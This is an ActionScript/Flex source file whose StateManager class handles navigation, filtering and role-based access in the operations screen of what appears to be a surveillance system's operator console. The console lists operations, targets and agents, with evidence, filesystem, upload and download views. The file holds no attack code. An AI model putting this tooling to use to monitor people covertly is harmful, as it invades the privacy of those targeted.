package it.ht.rcs.console.operations.main
{
  import flash.events.Event;
  
  import it.ht.rcs.console.agent.controller.AgentManager;
  import it.ht.rcs.console.agent.model.Agent;
  import it.ht.rcs.console.events.DataLoadedEvent;
  import it.ht.rcs.console.operation.controller.OperationManager;
  import it.ht.rcs.console.operation.model.Operation;
  import it.ht.rcs.console.operations.OperationsSection;
  import it.ht.rcs.console.target.controller.TargetManager;
  import it.ht.rcs.console.target.model.Target;
  
  import locale.R;
  
  import mx.collections.ArrayCollection;
  import mx.collections.ArrayList;
  import mx.collections.ListCollectionView;
  import mx.controls.Alert;
  
  import spark.collections.Sort;
  import spark.collections.SortField;

  public class StateManager
  {
    
    [Bindable]
    public var _item_view:ListCollectionView;
    
    [Bindable]
    public var selectedOperation:Operation;
    
    [Bindable]
    public var selectedTarget:Target;
    
    [Bindable]
    public var selectedAgent:Agent;
    
    private var section:OperationsSection;
    
    public function StateManager(section:OperationsSection)
    {
      this.section = section;
      
      customTypeSort = new Sort();
      var customTypeSortField:SortField = new SortField('customType', false, false);
      customTypeSortField.compareFunction = customTypeCompareFunction;
      customTypeSort.fields = [customTypeSortField, new SortField('name', false, false)];
    }
    
    public function manageItemSelection(item:*):void
    {
      if (item is Operation)
      {
        selectedOperation = item;
        setState('singleOperation');
      }
      
      else if (item is Target)
      {
        if (console.currentSession.user.is_tech()) {
          selectedTarget = item;
          setState('singleTarget');
        }
      }
      
      else if (item is Agent)
      {
        if (console.currentSession.user.is_view()) {
          selectedAgent = item;
          setState('singleAgent');
        }
      }
      
      else if (item is Object && item.customType == 'evidences')
      {
        Alert.show('Show Evidence Component');
      }
      
      else if (item is Object && item.customType == 'filesystem')
      {
        Alert.show('Show Filesystem Component');
      }
    }
    
    public function setState(state:String):void
    {
      
      stopManagers();
      
      switch (state) {
        case 'allOperations':
          selectedOperation = null; selectedTarget = null; selectedAgent = null;
          section.currentState = 'allOperations';
          CurrentManager = OperationManager;
          currentFilter = searchFilterFunction;
          OperationManager.instance.addEventListener(DataLoadedEvent.DATA_LOADED, onDataLoaded);
          OperationManager.instance.start();
          break;
        case 'singleOperation':
          selectedTarget = null; selectedAgent = null;
          section.currentState = 'singleOperation';
          CurrentManager = TargetManager;
          currentFilter = targetFilterFunction;
          TargetManager.instance.addEventListener(DataLoadedEvent.DATA_LOADED, onDataLoaded);
          TargetManager.instance.start();
          break;
        case 'allTargets':
          if (console.currentSession.user.is_tech()) {
            selectedOperation = null; selectedTarget = null; selectedAgent = null;
            section.currentState = 'allTargets';
            CurrentManager = TargetManager;
            currentFilter = searchFilterFunction;
            TargetManager.instance.addEventListener(DataLoadedEvent.DATA_LOADED, onDataLoaded);
            TargetManager.instance.start();
          }
          break;
        case 'singleTarget':
          if (console.currentSession.user.is_tech()) {
            selectedOperation = OperationManager.instance.getItem(selectedTarget.path[0]); selectedAgent = null;
            section.currentState = 'singleTarget';
            CurrentManager = AgentManager;
            currentFilter = agentFilterFunction;
            AgentManager.instance.addEventListener(DataLoadedEvent.DATA_LOADED, onDataLoaded);
            AgentManager.instance.start();
          }
          break;
        case 'allAgents':
          if (console.currentSession.user.is_view()) {
            selectedOperation = null; selectedTarget = null; selectedAgent = null;
            section.currentState = 'allAgents';
            CurrentManager = AgentManager;
            currentFilter = searchFilterFunction;
            AgentManager.instance.addEventListener(DataLoadedEvent.DATA_LOADED, onDataLoaded);
            AgentManager.instance.start();
          }
          break;
        case 'singleAgent':
          if (console.currentSession.user.is_view()) {
            selectedOperation = OperationManager.instance.getItem(selectedAgent.path[0]);
            selectedTarget = TargetManager.instance.getItem(selectedAgent.path[1]);
            section.currentState = 'singleAgent';
            CurrentManager = null;
            currentFilter = null;
            _item_view = new ListCollectionView(new ArrayList());
            addCustomTypes();
            _item_view.sort = customTypeSort;
            _item_view.filterFunction = searchFilterFunction;
            _item_view.refresh();
          }
          break;
        default:
          break;
      }
    }
    
    public function stopManagers():void
    {
      OperationManager.instance.removeEventListener(DataLoadedEvent.DATA_LOADED, onDataLoaded);
      OperationManager.instance.stop();
      
      TargetManager.instance.removeEventListener(DataLoadedEvent.DATA_LOADED, onDataLoaded);
      TargetManager.instance.stop();
      
      AgentManager.instance.removeEventListener(DataLoadedEvent.DATA_LOADED, onDataLoaded);
      AgentManager.instance.stop();
    }
    
    public function resetState():void
    {
      stopManagers();
      selectedOperation = null; selectedTarget = null; selectedAgent = null;
      section.currentState = 'allOperations';
    }
    
    private function addCustomTypes():void
    {
      if (section.currentState == 'singleTarget' || section.currentState == 'singleAgent') {
        _item_view.addItemAt({name: R.get('EVIDENCES'),   customType: 'evidences',  order: 0}, 0);
        _item_view.addItemAt({name: R.get('FILE_SYSTEM'), customType: 'filesystem', order: 1}, 0);
      }
      if (section.currentState == 'singleAgent') {
        _item_view.addItemAt({name: R.get('INFO'),     customType: 'info',     order: 2}, 0);
        _item_view.addItemAt({name: R.get('CONFIG'),   customType: 'config',   order: 3}, 0);
        _item_view.addItemAt({name: R.get('UPLOAD'),   customType: 'upload',   order: 4}, 0);
        _item_view.addItemAt({name: R.get('DOWNLOAD'), customType: 'download', order: 5}, 0);
      }
    }
    
    private function onDataLoaded(event:DataLoadedEvent = null):void
    {
      if (section.currentState == 'singleTarget') {
        _item_view = CurrentManager.instance.getView(customTypeSort, currentFilter);
        addCustomTypes();
      } else {
        _item_view = CurrentManager.instance.getView(null, currentFilter);
      }
    }
    
    private var CurrentManager:Class;
    private var currentFilter:Function;
    private var customTypeSort:Sort;
    
    private function customTypeCompareFunction(a:Object, b:Object):int
    {
      var aHas:Boolean = a.hasOwnProperty('customType');
      var bHas:Boolean = b.hasOwnProperty('customType');
      if (!aHas && !bHas) return 0;
      if (aHas && bHas) {
        var distance:int = a.order - b.order;
        return distance / Math.abs(distance);
      }
      if (aHas) return -1 else return 1;
    }
    
    private function searchFilterFunction(item:Object):Boolean
    {
      if (!section.buttonBar || !section.buttonBar.searchField || section.buttonBar.searchField.text == '')
        return true;
      var result:Boolean = String(item.name.toLowerCase()).indexOf(section.buttonBar.searchField.text.toLowerCase()) >= 0;
      return result;
    }
    
    private function targetFilterFunction(item:Object):Boolean
    {
      if (!(item is Target) || !(selectedOperation)) return true;
      if (item.path[0] == selectedOperation._id)
        return searchFilterFunction(item);
      else return false;
    }
    
    private function agentFilterFunction(item:Object):Boolean
    {
      if (!(item is Agent) || !(selectedTarget)) return true;
      if (item.path[1] == selectedTarget._id)
        return searchFilterFunction(item);
      else return false;
    }
    
  }
  
}